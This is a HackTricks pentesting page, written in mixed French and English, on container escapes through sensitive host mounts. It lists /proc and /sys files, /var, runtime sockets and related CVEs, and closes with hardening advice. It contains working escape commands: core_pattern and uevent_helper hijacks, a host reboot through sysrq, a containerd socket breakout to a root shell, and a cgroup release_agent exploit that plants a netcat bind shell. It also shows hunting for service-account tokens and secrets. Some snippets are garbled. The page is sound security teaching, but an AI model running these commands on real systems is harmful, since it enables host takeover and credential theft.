# Sensitive Mounts

{{#include ../../../../banners/hacktricks-training.md}}

L'exposition de `/proc`, `/sys` et `/var` sans une isolation appropriée des espaces de noms introduit des risques de sécurité significatifs, y compris l'augmentation de la surface d'attaque et la divulgation d'informations. Ces répertoires contiennent des fichiers sensibles qui, s'ils sont mal configurés ou accessibles par un utilisateur non autorisé, peuvent conduire à une évasion de conteneur, à une modification de l'hôte ou fournir des informations aidant à d'autres attaques. Par exemple, le montage incorrect de `-v /proc:/host/proc` peut contourner la protection AppArmor en raison de sa nature basée sur le chemin, laissant `/host/proc` non protégé.

**Vous pouvez trouver plus de détails sur chaque vulnérabilité potentielle dans** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## vulnérabilités procfs

### `/proc/sys`

Ce répertoire permet d'accéder à la modification des variables du noyau, généralement via `sysctl(2)`, et contient plusieurs sous-répertoires préoccupants :

#### **`/proc/sys/kernel/core_pattern`**

- Décrit dans [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
- Si vous pouvez écrire dans ce fichier, il est possible d'écrire un pipe `|` suivi du chemin vers un programme ou un script qui sera exécuté après qu'un crash se produise.
- Un attaquant peut trouver le chemin à l'intérieur de l'hôte vers son conteneur en exécutant `mount` et écrire le chemin vers un binaire à l'intérieur de son système de fichiers de conteneur. Ensuite, il peut faire planter un programme pour amener le noyau à exécuter le binaire en dehors du conteneur.

- **Exemple de test et d'exploitation** :
```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Set custom handler
sleep 5 && ./crash & # Trigger handler
```
Vérifiez [ce post](https://pwning.systems/posts/escaping-containers-for-fun/) pour plus d'informations.

Exemple de programme qui plante :
```c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) {
buf[i] = 1;
}
return 0;
}
```
#### **`/proc/sys/kernel/modprobe`**

- Détail dans [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Contient le chemin vers le chargeur de modules du noyau, invoqué pour charger des modules du noyau.
- **Exemple de vérification d'accès** :

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Vérifier l'accès à modprobe
```

#### **`/proc/sys/vm/panic_on_oom`**

- Référencé dans [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Un drapeau global qui contrôle si le noyau panique ou invoque le tueur OOM lorsqu'une condition OOM se produit.

#### **`/proc/sys/fs`**

- Selon [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), contient des options et des informations sur le système de fichiers.
- Un accès en écriture peut permettre diverses attaques par déni de service contre l'hôte.

#### **`/proc/sys/fs/binfmt_misc`**

- Permet d'enregistrer des interprètes pour des formats binaires non natifs en fonction de leur numéro magique.
- Peut conduire à une élévation de privilèges ou à un accès shell root si `/proc/sys/fs/binfmt_misc/register` est accessible en écriture.
- Exploit pertinent et explication :
- [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
- Tutoriel approfondi : [Lien vidéo](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Autres dans `/proc`

#### **`/proc/config.gz`**

- Peut révéler la configuration du noyau si `CONFIG_IKCONFIG_PROC` est activé.
- Utile pour les attaquants afin d'identifier les vulnérabilités dans le noyau en cours d'exécution.

#### **`/proc/sysrq-trigger`**

- Permet d'invoquer des commandes Sysrq, pouvant provoquer des redémarrages immédiats du système ou d'autres actions critiques.
- **Exemple de redémarrage de l'hôte** :

```bash
echo b > /proc/sysrq-trigger # Redémarre l'hôte
```

#### **`/proc/kmsg`**

- Expose les messages du tampon circulaire du noyau.
- Peut aider dans les exploits du noyau, les fuites d'adresses et fournir des informations sensibles sur le système.

#### **`/proc/kallsyms`**

- Liste les symboles exportés par le noyau et leurs adresses.
- Essentiel pour le développement d'exploits du noyau, en particulier pour surmonter KASLR.
- Les informations d'adresse sont restreintes avec `kptr_restrict` réglé sur `1` ou `2`.
- Détails dans [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

- Interface avec le périphérique mémoire du noyau `/dev/mem`.
- Historiquement vulnérable aux attaques d'élévation de privilèges.
- Plus d'informations sur [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

- Représente la mémoire physique du système au format ELF core.
- La lecture peut révéler le contenu de la mémoire du système hôte et d'autres conteneurs.
- La grande taille du fichier peut entraîner des problèmes de lecture ou des plantages de logiciels.
- Utilisation détaillée dans [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

- Interface alternative pour `/dev/kmem`, représentant la mémoire virtuelle du noyau.
- Permet la lecture et l'écriture, donc la modification directe de la mémoire du noyau.

#### **`/proc/mem`**

- Interface alternative pour `/dev/mem`, représentant la mémoire physique.
- Permet la lecture et l'écriture, la modification de toute la mémoire nécessite de résoudre les adresses virtuelles en adresses physiques.

#### **`/proc/sched_debug`**

- Renvoie des informations sur la planification des processus, contournant les protections de l'espace de noms PID.
- Expose les noms de processus, les ID et les identifiants de cgroup.

#### **`/proc/[pid]/mountinfo`**

- Fournit des informations sur les points de montage dans l'espace de noms de montage du processus.
- Expose l'emplacement du `rootfs` ou de l'image du conteneur.

### Vulnérabilités `/sys`

#### **`/sys/kernel/uevent_helper`**

- Utilisé pour gérer les `uevents` des périphériques du noyau.
- Écrire dans `/sys/kernel/uevent_helper` peut exécuter des scripts arbitraires lors des déclenchements de `uevent`.
- **Exemple d'exploitation** :
```bash

#### Creates a payload

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### Finds host path from OverlayFS mount for container

host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)

#### Sets uevent_helper to malicious helper

echo "$host_path/evil-helper" > /sys/kernel/uevent_helper

#### Triggers a uevent

echo change > /sys/class/mem/null/uevent

#### Reads the output

cat /output
```

#### **`/sys/class/thermal`**

- Controls temperature settings, potentially causing DoS attacks or physical damage.

#### **`/sys/kernel/vmcoreinfo`**

- Leaks kernel addresses, potentially compromising KASLR.

#### **`/sys/kernel/security`**

- Houses `securityfs` interface, allowing configuration of Linux Security Modules like AppArmor.
- Access might enable a container to disable its MAC system.

#### **`/sys/firmware/efi/vars` and `/sys/firmware/efi/efivars`**

- Exposes interfaces for interacting with EFI variables in NVRAM.
- Misconfiguration or exploitation can lead to bricked laptops or unbootable host machines.

#### **`/sys/kernel/debug`**

- `debugfs` offers a "no rules" debugging interface to the kernel.
- History of security issues due to its unrestricted nature.

### `/var` Vulnerabilities

The host's **/var** folder contains container runtime sockets and the containers' filesystems.
If this folder is mounted inside a container, that container will get read-write access to other containers' file systems
with root privileges. This can be abused to pivot between containers, to cause a denial of service, or to backdoor other
containers and applications that run in them.

#### Kubernetes

If a container like this is deployed with Kubernetes:

```yaml
apiVersion: v1  
kind: Pod  
metadata:  
  name: pod-mounts-var  
  labels:  
    app: pentest  
spec:  
  containers:  
  - name: pod-mounts-var-folder  
    image: alpine  
    volumeMounts:  
    - mountPath: /host-var  
      name: noderoot  
    command: [ "/bin/sh", "-c", "--" ]  
    args: [ "while true; do sleep 30; done;" ]  
  volumes:  
  - name: noderoot  
    hostPath:  
      path: /var
```

Inside the **pod-mounts-var-folder** container:

```bash
/ # find /host-var/ -type f -iname '*.env*' 2>/dev/null

/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/201/fs/usr/src/app/.env.example
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/135/fs/docker-entrypoint.d/15-local-resolvers.envsh

/ # cat /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/105/fs/usr/src/app/.env.example | grep -i secret
JWT_SECRET=85d<SNIP>a0
REFRESH_TOKEN_SECRET=14<SNIP>ea

/ # find /host-var/ -type f -iname 'index.html' 2>/dev/null
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/57/fs/usr/src/app/node_modules/@mapbox/node-pre-gyp/lib/util/nw-pre-gyp/index.html
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html

/ # echo '<!DOCTYPE html><html lang="fr"><head><script>alert("XSS stocké !")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index2.html
```

The XSS was achieved:

![Stored XSS via mounted /var folder](/images/stored-xss-via-mounted-var-folder.png)

Note that the container DOES NOT require a restart or anything. Any changes made via the mounted **/var** folder will be applied instantly.

You can also replace configuration files, binaries, services, application files, and shell profiles to achieve automatic (or semi-automatic) RCE.

##### Access to cloud credentials

The container can read K8s serviceaccount tokens or AWS webidentity tokens
which allows the container to gain unauthorized access to K8s or cloud:

```bash
/ # find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
/host-var/lib/kubelet/pods/21411f19-934c-489e-aa2c-4906f278431e/volumes/kubernetes.io~projected/kube-api-access-64jw2/..2025_01_22_12_37_42.4197672587/token
<SNIP>
/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/kube-api-access-bljdj/..2025_01_22_12_17_53.265458487/token
/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/aws-iam-token/..2025_01_22_03_45_56.2328221474/token
/host-var/lib/kubelet/pods/5fb6bd26-a6aa-40cc-abf7-ecbf18dde1f6/volumes/kubernetes.io~projected/kube-api-access-fm2t6/..2025_01_22_12_25_25.3018586444/token
```

#### Docker

The exploitation in Docker (or in Docker Compose deployments) is exactly the same, except that usually
the other containers' filesystems are available under a different base path:

```bash
$ docker info | grep -i 'docker root\|storage driver'
Pilote de stockage : overlay2
Répertoire racine de Docker : /var/lib/docker
```

So the filesystems are under `/var/lib/docker/overlay2/`:

```bash
```markdown
$ sudo ls -la /var/lib/docker/overlay2

drwx--x---  4 root root  4096 Jan  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d
drwx--x---  4 root root  4096 Jan 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496
drwx--x---  4 root root  4096 Jan  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f
drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2
<SNIP>
```
```

#### Note

The actual paths may differ in different setups, which is why your best bet is to use the **find** command to
locate the other containers' filesystems and SA / web identity tokens



### Other Sensitive Host Sockets and Directories (2023-2025)

Mounting certain host Unix sockets or writable pseudo-filesystems is equivalent to giving the container full root on the node. **Treat the following paths as highly sensitive and never expose them to untrusted workloads**:

```text
/run/containerd/containerd.sock     # socket CRI de containerd  
/var/run/crio/crio.sock             # socket d'exécution CRI-O  
/run/podman/podman.sock             # API Podman (avec ou sans privilèges root)  
/var/run/kubelet.sock               # API Kubelet sur les nœuds Kubernetes  
/run/firecracker-containerd.sock    # Kata / Firecracker
```

Attack example abusing a mounted **containerd** socket:

```bash
# à l'intérieur du conteneur (le socket est monté à /host/run/containerd.sock)
ctr --address /host/run/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /host/run/containerd.sock run --tty --privileged --mount \
type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/bash   # shell root complet sur l'hôte
```

A similar technique works with **crictl**, **podman** or the **kubelet** API once their respective sockets are exposed.

Writable **cgroup v1** mounts are also dangerous. If `/sys/fs/cgroup` is bind-mounted **rw** and the host kernel is vulnerable to **CVE-2022-0492**, an attacker can set a malicious `release_agent` and execute arbitrary code in the *initial* namespace:

```bash
# en supposant que le conteneur a CAP_SYS_ADMIN et un noyau vulnérable
mkdir -p /tmp/x && echo 1 > /tmp/x/notify_on_release

echo '/tmp/pwn' > /sys/fs/cgroup/release_agent   # nécessite CVE-2022-0492

echo -e '#!/bin/sh\nnc -lp 4444 -e /bin/sh' > /tmp/pwn && chmod +x /tmp/pwn
sh -c "echo 0 > /tmp/x/cgroup.procs"  # déclenche l'événement empty-cgroup
```

When the last process leaves the cgroup, `/tmp/pwn` runs **as root on the host**. Patched kernels (>5.8 with commit `32a0db39f30d`) validate the writer’s capabilities and block this abuse.

### Mount-Related Escape CVEs (2023-2025)

* **CVE-2024-21626 – runc “Leaky Vessels” file-descriptor leak**
runc ≤1.1.11 leaked an open directory file descriptor that could point to the host root. A malicious image or `docker exec` could start a container whose *working directory* is already on the host filesystem, enabling arbitrary file read/write and privilege escalation. Fixed in runc 1.1.12 (Docker ≥25.0.3, containerd ≥1.7.14).

```Dockerfile
FROM scratch
WORKDIR /proc/self/fd/4   # 4 == "/" on the host leaked by the runtime
CMD ["/bin/sh"]
```

* **CVE-2024-23651 / 23653 – BuildKit OverlayFS copy-up TOCTOU**
A race condition in the BuildKit snapshotter let an attacker replace a file that was about to be *copy-up* into the container’s rootfs with a symlink to an arbitrary path on the host, gaining write access outside the build context. Fixed in BuildKit v0.12.5 / Buildx 0.12.0. Exploitation requires an untrusted `docker build` on a vulnerable daemon.

### Hardening Reminders (2025)

1. Bind-mount host paths **read-only** whenever possible and add `nosuid,nodev,noexec` mount options.
2. Prefer dedicated side-car proxies or rootless clients instead of exposing the runtime socket directly.
3. Keep the container runtime up-to-date (runc ≥1.1.12, BuildKit ≥0.12.5, containerd ≥1.7.14).
4. In Kubernetes, use `securityContext.readOnlyRootFilesystem: true`, the *restricted* PodSecurity profile and avoid `hostPath` volumes pointing to the paths listed above.

### References

- [runc CVE-2024-21626 advisory](https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv)
- [Unit 42 analysis of CVE-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
- [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
- [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)

{{#include ../../../../banners/hacktricks-training.md}}
